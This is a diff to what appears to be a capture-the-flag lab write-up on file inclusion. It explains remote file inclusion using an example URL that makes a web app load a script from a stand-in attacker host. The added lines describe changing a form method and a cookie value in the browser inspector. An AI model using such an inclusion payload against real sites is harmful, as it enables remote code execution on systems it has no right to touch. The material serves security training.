@@ -455,5 +455,19 @@ The following figure is an example of steps for a successful RFI attack! Let's s
 
 First attacker injects malicious URL, which points to the attacker's server, such as ```http://webapp.thm.index.php?lang=http://attacker.thm/cmd.txt```. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the ```Hello THM``` message. 
 
+## FI Inclusion Challenges 
+
+### Change the GET to POST 
+
+Open the inspector and change the form < form action="#" method="GET" > to < form action"#" method="POST" >
+  
+  ![image](https://user-images.githubusercontent.com/79100627/167317338-d3c6137b-c902-429c-8069-065e64f5b71e.png)
+  ![image](https://user-images.githubusercontent.com/79100627/167317358-ee8b880e-c58c-44ce-9e56-624d5121d786.png)
+
+### Change the Cookie 
+
+Open the inspector and you can change the cookie value in the **Storage**
+
+![image](https://user-images.githubusercontent.com/79100627/167317615-316119d6-5ba3-4079-97cd-6a9c9c58b1a9.png)
 
 
